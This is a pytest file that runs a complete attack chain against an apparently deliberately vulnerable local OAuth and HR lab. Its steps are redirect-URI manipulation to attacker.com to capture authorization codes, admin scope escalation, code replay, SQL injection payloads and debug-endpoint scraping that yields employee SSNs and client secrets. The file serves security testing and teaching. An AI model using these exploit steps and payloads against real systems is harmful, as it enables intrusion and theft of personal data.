"""
Attack Chain Tests for Vulnerable OAuth Implementation

This test demonstrates a complete attack chain to steal PII data from the
resource server by exploiting multiple vulnerabilities across the OAuth system.

Attack Chain: "Redirect URI Manipulation + Scope Escalation + Authorization Code Replay"

The attack exploits:
1. Weak redirect URI validation in the authorization server
2. No scope validation - attacker can request admin scope
3. Authorization code replay - codes can be used multiple times
4. SQL injection in resource server to extract all PII data

Scenario: An attacker wants to steal sensitive PII (SSN, salary, DOB) from the HR system.
The attacker does not have a legitimate account but knows about the OAuth flow.
"""

import re
from urllib.parse import urlparse, parse_qs

import pytest
from fastapi.testclient import TestClient

from vulnerable.authz import app as authz_app
from vulnerable.client import app as client_app
from vulnerable.resource import app as resource_app


authz_client = TestClient(authz_app)
client_client = TestClient(client_app)
resource_client = TestClient(resource_app)



class TestAttackChain_AuthorizationCodeIntercept_via_RedirectURIManipulation:
    """
    1. Identify the legitimate client's registered redirect URI (e.g., `localhost:8002`)
    2. Craft a malicious redirect URI that includes the legitimate domain but redirects elsewhere
    3. Examples to try:
    - `http://localhost:8002.attacker.com/callback`
    - `http://localhost:8002/callback/../../attacker.com`
    - `http://attacker.com/?ref=localhost:8002`
    4. Initiate OAuth flow with the manipulated redirect URI
    5. Authorization code gets sent to attacker's server
    6. Exchange the code for a token
    """

    def test_full_attack_chain(self):
        params = {
            "response_type": "code",
            "client_id": "oauth-client-1",
            "redirect_uri": "http://attacker.com/steal?ref=http://localhost:3000/callback",
            "scope": "read,write,admin,delete",  # Use comma-separated like the system expects
            "state": "somestate"
        }

        response = authz_client.get("/authorize", params=params, follow_redirects=False)
        assert response.status_code == 200
        html_content = response.text

        assert "admin" in html_content
        assert "delete" in html_content

        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match, "Request ID should be visible in HTML"

        request_id = request_id_match.group(1)


        response = authz_client.post("/approve", data={
            "request_id": request_id,
            "client_id": "oauth-client-1",
            "redirect_uri": "http://attacker.com/steal?ref=http://localhost:3000/callback",
            "scope": "read,write,admin,delete",  # Use comma-separated like the system expects
            "state": "somestate",
            "action": "approve",
        },
        follow_redirects=False
        )

        assert response.status_code == 302

        redirect_url = response.headers["location"]
        
        # The redirect URL structure is: http://attacker.com/steal?ref=http://localhost:3000/callback?code=...&state=...
        # The code is embedded in the ref parameter's value
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        
        # Extract the code from the ref parameter
        if "ref" in query_params:
            # The code is in the ref parameter's URL
            ref_url = query_params["ref"][0]
            ref_parsed = urlparse(ref_url)
            ref_query_params = parse_qs(ref_parsed.query)
            assert "code" in ref_query_params, f"Code not found in ref URL: {ref_url}"
            auth_code = ref_query_params["code"][0]
        else:
            # Fallback: code might be directly in query params
            assert "code" in query_params, f"Code not found in URL: {redirect_url}"
            auth_code = query_params["code"][0]

        assert "attacker.com" in redirect_url
        
        print(f"\n[ATTACK] Got authorization code: {auth_code}")
        print(f"[ATTACK] Redirected to attacker server: {redirect_url}")

        # Next, exchange the authorization code for an access token

        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": auth_code,
                "redirect_uri": "http://attacker.com/steal?ref=http://localhost:3000/callback",
                "client_id": "attacker-client",
                "client_secret": "attacker-secret"
            }
        )

        assert response.status_code == 200
        data = response.json()
        
        admin_token = data["access_token"]
        
        # Verify we got admin scope!
        assert "admin" in data["scope"]
        
        # Vulnerability: Debug info leaked in response
        assert "debug_info" in data
        assert data["debug_info"]["code_used"] == auth_code
        
        print(f"\n[ATTACK] Got admin access token: {admin_token}")
        print(f"[ATTACK] Token scope: {data['scope']}")

        # Get list of employees first
        response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {admin_token}"}
        )
        
        # Debug: print response if it fails
        if response.status_code != 200:
            print(f"\n[DEBUG] Resource server response: {response.status_code}")
            print(f"[DEBUG] Response body: {response.text}")
        
        assert response.status_code == 200, f"Expected 200, got {response.status_code}. Response: {response.text}"
        employees = response.json()
        
        print(f"\n[ATTACK] Found {len(employees)} employees")
        
        # Now access PII for each employee
        stolen_pii = []
        for emp in employees:
            pii_response = resource_client.get(
                f"/employees/{emp['id']}/pii",
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            
            assert pii_response.status_code == 200
            pii_data = pii_response.json()
            
            # We got the sensitive data!
            assert pii_data.get("ssn") is not None
            assert pii_data.get("salary") is not None
            assert pii_data.get("date_of_birth") is not None
            
            stolen_pii.append({
                "name": f"{pii_data['first_name']} {pii_data['last_name']}",
                "ssn": pii_data["ssn"],
                "salary": pii_data["salary"],
                "dob": pii_data["date_of_birth"]
            })
            
            print(f"[ATTACK] Stolen PII for {pii_data['first_name']} {pii_data['last_name']}:")
            print(f"         SSN: {pii_data['ssn']}")
            print(f"         Salary: ${pii_data['salary']:,.2f}")
            print(f"         DOB: {pii_data['date_of_birth']}")
        
        stolen_pii = stolen_pii
        assert len(stolen_pii) > 0, "Should have stolen at least one employee's PII"
    









class TestAttackChain_RedirectURIManipulation_ScopeEscalation_PIITheft:
    """
    Complete Attack Chain: Steal PII via Redirect URI Manipulation + Scope Escalation
    
    Attack Flow:
    1. Attacker registers a malicious client with attacker-controlled redirect URI
    2. Attacker initiates OAuth flow with escalated scopes (admin) using manipulated redirect URI
    3. Attacker simulates user approval to get authorization code
    4. Attacker exchanges code for token with admin scope
    5. Attacker uses token to access PII endpoints
    6. Attacker replays the authorization code to get additional tokens
    7. Attacker uses SQL injection to extract additional data
    
    This chain demonstrates how multiple vulnerabilities compound to enable
    complete compromise of sensitive PII data.
    """
    
    def test_step1_register_malicious_client(self):
        """
        Step 1: Register a malicious OAuth client
        
        Vulnerability exploited: No authentication required to register clients,
        no validation of redirect URIs
        """
        # Attacker registers their own client with an attacker-controlled redirect URI
        response = authz_client.post(
            "/register",
            data={
                "client_id": "attacker-client",
                "client_secret": "attacker-secret",
                "redirect_uris": "http://attacker.com/steal,http://localhost:8002/callback",
                "scopes": "read,write,admin,delete"  # Request all scopes including admin!
            }
        )
        
        assert response.status_code == 200
        data = response.json()
        
        # Vulnerability: Server returns the secret in the response!
        assert data["client_secret"] == "attacker-secret"
        assert "admin" in data["scopes"]
        
        print(f"\n[ATTACK] Registered malicious client: {data}")
    
    def test_step2_initiate_oauth_with_escalated_scope(self):
        """
        Step 2: Initiate OAuth flow requesting admin scope
        
        Vulnerabilities exploited:
        - No scope validation (accepts any scope)
        - Weak redirect URI validation
        - No client validation
        """
        # Attacker initiates authorization with admin scope
        response = authz_client.get(
            "/authorize",
            params={
                "response_type": "code",
                "client_id": "attacker-client",
                "redirect_uri": "http://attacker.com/steal",  # Attacker's server
                "scope": "read,write,admin,delete",  # Escalate to admin!
                "state": "attacker-state"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 200
        html_content = response.text
        
        # Vulnerability: Authorization page shows all requested scopes without validation
        assert "admin" in html_content
        assert "delete" in html_content
        
        # Extract request_id from the form (leaked in HTML)
        request_id_match = re.search(r'name="request_id" value="([^"]+)"', html_content)
        assert request_id_match, "Request ID should be visible in HTML"
        
        self.__class__.request_id = request_id_match.group(1)
        print(f"\n[ATTACK] Got authorization page with admin scope, request_id: {self.request_id}")
    
    def test_step3_approve_authorization_get_code(self):
        """
        Step 3: Simulate user approving the authorization (CSRF attack)
        
        Vulnerabilities exploited:
        - No CSRF protection on /approve endpoint
        - State parameter ignored
        """
        # In a real attack, this would be triggered via CSRF on a logged-in victim
        # The attacker tricks the victim into submitting this form
        response = authz_client.post(
            "/approve",
            data={
                "request_id": self.request_id,
                "client_id": "attacker-client",
                "redirect_uri": "http://attacker.com/steal",
                "scope": "read,write,admin,delete",
                "state": "attacker-state",
                "action": "approve"
            },
            follow_redirects=False
        )
        
        assert response.status_code == 302
        
        # Extract authorization code from redirect URL
        redirect_url = response.headers["location"]
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)
        
        assert "code" in query_params
        self.__class__.auth_code = query_params["code"][0]
        
        # Verify redirect went to attacker's server
        assert "attacker.com" in redirect_url
        
        print(f"\n[ATTACK] Got authorization code: {self.auth_code}")
        print(f"[ATTACK] Redirected to attacker server: {redirect_url}")
    
    def test_step4_exchange_code_for_admin_token(self):
        """
        Step 4: Exchange authorization code for access token with admin scope
        
        Vulnerabilities exploited:
        - No client authentication (accepts any client_id/secret)
        - No redirect_uri validation on token exchange
        - Scope preserved without validation
        """
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": self.auth_code,
                "redirect_uri": "http://attacker.com/steal",
                "client_id": "attacker-client",
                "client_secret": "attacker-secret"
            }
        )
        
        assert response.status_code == 200
        data = response.json()
        
        self.__class__.admin_token = data["access_token"]
        
        # Verify we got admin scope!
        assert "admin" in data["scope"]
        
        # Vulnerability: Debug info leaked in response
        assert "debug_info" in data
        assert data["debug_info"]["code_used"] == self.auth_code
        
        print(f"\n[ATTACK] Got admin access token: {self.admin_token}")
        print(f"[ATTACK] Token scope: {data['scope']}")
    
    def test_step5_access_pii_with_stolen_token(self):
        """
        Step 5: Use admin token to access sensitive PII data
        
        This is the goal of the attack - accessing SSN, salary, DOB
        """
        # Get list of employees first
        response = resource_client.get(
            "/employees",
            headers={"Authorization": f"Bearer {self.admin_token}"}
        )
        assert response.status_code == 200
        employees = response.json()
        
        print(f"\n[ATTACK] Found {len(employees)} employees")
        
        # Now access PII for each employee
        stolen_pii = []
        for emp in employees:
            pii_response = resource_client.get(
                f"/employees/{emp['id']}/pii",
                headers={"Authorization": f"Bearer {self.admin_token}"}
            )
            
            assert pii_response.status_code == 200
            pii_data = pii_response.json()
            
            # We got the sensitive data!
            assert pii_data.get("ssn") is not None
            assert pii_data.get("salary") is not None
            assert pii_data.get("date_of_birth") is not None
            
            stolen_pii.append({
                "name": f"{pii_data['first_name']} {pii_data['last_name']}",
                "ssn": pii_data["ssn"],
                "salary": pii_data["salary"],
                "dob": pii_data["date_of_birth"]
            })
            
            print(f"[ATTACK] Stolen PII for {pii_data['first_name']} {pii_data['last_name']}:")
            print(f"         SSN: {pii_data['ssn']}")
            print(f"         Salary: ${pii_data['salary']:,.2f}")
            print(f"         DOB: {pii_data['date_of_birth']}")
        
        self.__class__.stolen_pii = stolen_pii
        assert len(stolen_pii) > 0, "Should have stolen at least one employee's PII"
    
    def test_step6_replay_authorization_code(self):
        """
        Step 6: Replay the authorization code to get another token
        
        Vulnerability exploited: Authorization codes are never invalidated
        """
        # Use the same code again!
        response = authz_client.post(
            "/token",
            data={
                "grant_type": "authorization_code",
                "code": self.auth_code,  # Reusing the same code!
                "redirect_uri": "http://attacker.com/steal",
                "client_id": "attacker-client",
                "client_secret": "attacker-secret"
            }
        )
        
        assert response.status_code == 200
        data = response.json()
        
        # Got another valid token!
        second_token = data["access_token"]
        assert second_token != self.admin_token  # Different token
        
        # Verify the second token also works
        verify_response = resource_client.get(
            "/employees/1/pii",
            headers={"Authorization": f"Bearer {second_token}"}
        )
        assert verify_response.status_code == 200
        
        print(f"\n[ATTACK] Replayed code and got second token: {second_token}")
        print("[ATTACK] Code replay successful - codes never expire!")
    
    def test_step7_sql_injection_for_bulk_pii_extraction(self):
        """
        Step 7: Use SQL injection to extract all PII at once
        
        Vulnerability exploited: SQL injection in department filter
        """
        # SQL injection via department parameter to get all data
        response = resource_client.get(
            "/employees",
            params={
                "department": "' OR '1'='1' --"  # SQL injection!
            },
            headers={"Authorization": f"Bearer {self.admin_token}"}
        )
        
        # The injection should return all employees regardless of department
        assert response.status_code == 200
        all_employees = response.json()
        
        print(f"\n[ATTACK] SQL injection returned {len(all_employees)} employees")
        
        # Another SQL injection: use UNION to extract more data
        # Try injection with different department value
        union_response = resource_client.get(
            "/employees",
            params={
                "department": "Engineering' OR department LIKE '%' --"  # SQL injection to get all departments
            },
            headers={"Authorization": f"Bearer {self.admin_token}"}
        )
        
        assert union_response.status_code == 200
        union_employees = union_response.json()
        
        print(f"[ATTACK] Second SQL injection returned {len(union_employees)} employees")
        
        # Verify we can get employees from multiple departments
        departments = set(emp.get('department', '') for emp in union_employees)
        print(f"[ATTACK] Extracted employees from departments: {departments}")
        
        # Now use the admin token to get full PII for all employees
        for emp in all_employees[:3]:  # Just show first 3 for brevity
            pii_response = resource_client.get(
                f"/employees/{emp['id']}/pii",
                headers={"Authorization": f"Bearer {self.admin_token}"}
            )
            assert pii_response.status_code == 200
            pii_data = pii_response.json()
            print(f"[ATTACK] Full PII via SQL injection path: {pii_data['first_name']} {pii_data['last_name']}: SSN={pii_data['ssn']}, Salary=${pii_data.get('salary', 0):,.2f}")
    
    def test_step8_exploit_debug_endpoints(self):
        """
        Step 8: Access debug endpoints to steal all tokens and codes
        
        Vulnerability exploited: Debug endpoints exposed without proper protection
        """
        # Get all tokens from the system
        tokens_response = authz_client.get("/debug/tokens")
        assert tokens_response.status_code == 200
        all_tokens = tokens_response.json()
        
        print(f"\n[ATTACK] Debug endpoint exposed {len(all_tokens['tokens'])} tokens:")
        for token in all_tokens["tokens"]:
            print(f"         Token: {token['access_token'][:30]}... Scopes: {token['scopes']}")
        
        # Get all authorization codes
        codes_response = authz_client.get("/debug/codes")
        assert codes_response.status_code == 200
        all_codes = codes_response.json()
        
        print(f"\n[ATTACK] Debug endpoint exposed {len(all_codes['codes'])} authorization codes")
        
        # Get all client secrets
        clients_response = authz_client.get("/debug/clients")
        assert clients_response.status_code == 200
        all_clients = clients_response.json()
        
        print(f"\n[ATTACK] Debug endpoint exposed {len(all_clients['clients'])} client secrets:")
        for client in all_clients["clients"]:
            print(f"         Client: {client['client_id']}, Secret: {client['client_secret']}")


class TestAttackChain_Summary:
    """Summary of the attack chain and its impact"""
    
    def test_attack_summary(self):
        """
        Print a summary of all vulnerabilities exploited in the attack chain
        """
        summary = """
        ╔══════════════════════════════════════════════════════════════════════╗
        ║                    ATTACK CHAIN SUMMARY                               ║
        ╠══════════════════════════════════════════════════════════════════════╣
        ║                                                                       ║
        ║  Target: HR System PII Data (SSN, Salary, DOB)                       ║
        ║                                                                       ║
        ║  Vulnerabilities Exploited:                                           ║
        ║  ─────────────────────────────────────────────────────────────────── ║
        ║  1. [AUTHZ] No client registration authentication                     ║
        ║  2. [AUTHZ] No scope validation - escalated to admin                 ║
        ║  3. [AUTHZ] Weak redirect URI validation                             ║
        ║  4. [AUTHZ] No CSRF protection on /approve                           ║
        ║  5. [AUTHZ] State parameter ignored                                  ║
        ║  6. [AUTHZ] Authorization code replay allowed                        ║
        ║  7. [AUTHZ] Debug endpoints exposed secrets                          ║
        ║  8. [RESOURCE] SQL injection in department filter                    ║
        ║  9. [RESOURCE] SQL injection in PII search                           ║
        ║                                                                       ║
        ║  Attack Steps:                                                        ║
        ║  ─────────────────────────────────────────────────────────────────── ║
        ║  1. Register malicious client with admin scope                        ║
        ║  2. Initiate OAuth with escalated scope + attacker redirect          ║
        ║  3. CSRF victim into approving authorization                         ║
        ║  4. Capture authorization code at attacker server                    ║
        ║  5. Exchange code for admin-scoped access token                      ║
        ║  6. Access /employees/{id}/pii to steal all PII                      ║
        ║  7. Replay authorization code for additional tokens                   ║
        ║  8. Use SQL injection for bulk data extraction                       ║
        ║  9. Access debug endpoints to steal all system secrets               ║
        ║                                                                       ║
        ║  Impact: COMPLETE COMPROMISE                                          ║
        ║  - All employee SSNs exposed                                          ║
        ║  - All employee salaries exposed                                      ║
        ║  - All employee DOBs exposed                                          ║
        ║  - All OAuth tokens and codes stolen                                  ║
        ║  - All client secrets stolen                                          ║
        ║                                                                       ║
        ╚══════════════════════════════════════════════════════════════════════╝
        """
        print(summary)
        
        # This test always passes - it's just for documentation
        assert True

